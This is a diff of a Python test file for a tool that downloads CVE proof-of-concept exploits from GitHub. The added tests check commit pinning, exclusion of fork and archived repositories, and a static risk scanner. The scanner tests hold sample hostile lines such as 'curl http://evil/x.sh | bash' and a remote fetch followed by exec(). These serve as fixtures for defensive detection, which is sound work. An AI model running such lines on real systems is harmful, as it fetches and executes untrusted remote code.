@@ -2,7 +2,10 @@
 import os
 
 import poc_downloader
-from poc_downloader import download_poc_for_cve, _is_poc_file, _parse_github_blob
+from poc_downloader import (
+    download_poc_for_cve, _is_poc_file, _parse_github_blob,
+    _poc_risk_scan, _community_poc_verified,
+)
 
 
 def _result(url, is_poc=True):
@@ -87,3 +90,81 @@ def test_parse_github_blob():
     assert _parse_github_blob("https://github.com/foo/bar/blob/main/exploit.py") == ("foo", "bar", "exploit.py")
     assert _parse_github_blob("https://github.com/foo/bar") is None
     assert _parse_github_blob("https://github.com/foo/bar/tree/main/src") is None
+
+
+# ---------- 供应链加固回归测试 ----------
+
+def test_github_download_records_commit_sha(fake_github, tmp_output):
+    """下载应 pin commit SHA（fake_github 的 _repo_head_sha 返回 testsha123）。"""
+    fake_github(files=["exploit.py"], raw_map={"exploit.py": b"print('poc')"})
+    result = _result("https://github.com/foo/bar/blob/main/exploit.py")
+    download_poc_for_cve(result, "Test_Device")
+    ref = result["references"][0]
+    assert ref.get("commit_sha") == "testsha123"
+    assert ref.get("commit_pinned") is True
+
+
+def test_github_download_passes_pinned_ref(monkeypatch, tmp_output):
+    """列树与 raw 下载应传 pin 住的 commit SHA（防 HEAD 漂移/指向被篡改）。"""
+    monkeypatch.setattr(poc_downloader, "_repo_head_sha", lambda owner, repo: "testsha123")
+    seen = {}
+    monkeypatch.setattr(poc_downloader, "list_repo_files",
+                        lambda owner, repo, ref=None: seen.update(list_ref=ref) or (["exploit.py"], 200))
+    monkeypatch.setattr(poc_downloader, "download_raw",
+                        lambda owner, repo, path, ref=None: seen.update(raw_ref=ref) or (b"x", 200))
+    result = _result("https://github.com/foo/bar")
+    download_poc_for_cve(result, "Test_Device")
+    assert seen.get("list_ref") == "testsha123"
+    assert seen.get("raw_ref") == "testsha123"
+
+
+def test_community_search_filters_fork_archived(monkeypatch):
+    """社区 POC 搜索必须排除 fork 与已归档仓库（防攻击者借 fork 投毒）。"""
+    captured = {}
+
+    class FakeResp:
+        status_code = 200
+
+        def json(self):
+            return {"items": []}
+
+    def fake_get(url, **kw):
+        captured.update(kw.get("params", {}))
+        return FakeResp()
+
+    monkeypatch.setattr(poc_downloader, "_safe_get", fake_get)
+    poc_downloader.search_github_poc_repos("CVE-2024-0001")
+    q = captured.get("q", "")
+    assert "fork:false" in q
+    assert "archived:false" in q
+
+
+# ---------- 社区 POC 静态风险扫描 ----------
+
+def test_poc_risk_scan_flags_download_execute():
+    ok, reason = _poc_risk_scan(b"#!/bin/sh\ncurl http://evil/x.sh | bash\n")
+    assert ok is False
+    assert "curl|sh" in reason
+
+
+def test_poc_risk_scan_flags_remote_eval():
+    ok, reason = _poc_risk_scan(b"import requests\ncode = requests.get('http://x/a.py').text\nexec(code)")
+    assert ok is False
+    assert "远程拉取后 eval/exec" in reason
+
+
+def test_poc_risk_scan_safe_passes():
+    ok, reason = _poc_risk_scan(b"#!/usr/bin/env python\nimport socket\ns.connect(('1.2.3.4', 9999))\n")
+    assert ok is True
+    assert reason == "static_ok"
+
+
+def test_community_poc_verified_allowlist(monkeypatch):
+    """白名单仓库跳过扫描直接视为已验证。"""
+    monkeypatch.setattr(poc_downloader, "VERIFIED_POC_REPOS", {"foo/bar"})
+    ok, reason = _community_poc_verified("foo", "bar", b"curl http://x | sh")
+    assert ok is True
+    assert reason == "allowlist"
+    # 非白名单仓库 → 走扫描，命中危险模式 → 不可信
+    ok, reason = _community_poc_verified("foo", "other", b"curl http://x | sh")
+    assert ok is False
